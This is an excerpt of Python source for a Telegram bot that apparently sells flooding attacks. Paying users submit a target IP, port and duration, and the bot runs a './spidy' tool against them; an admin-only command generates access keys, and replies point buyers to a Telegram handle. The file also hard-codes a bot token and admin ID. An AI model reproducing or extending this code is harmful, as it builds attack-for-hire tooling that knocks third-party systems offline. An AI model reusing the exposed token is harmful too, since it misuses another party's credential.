...
# Configuration
TOKEN = '7741172708:AAFP4tBw7YN_QoC8wKAsjdHQJ49eSkIdiVY'
ADMIN_USER_ID = 6470028996
...
def handle_genkey(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @ASHRAFGMING")
        return
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./spidy {target_ip} {target_port} {duration} 1000")
...
def handle_attack(message):
    ...
    if not user_data or user_data['plan'] == 0:
        bot.reply_to(message, "𝘿𝙈-> @ASHRAFGMING")
        return
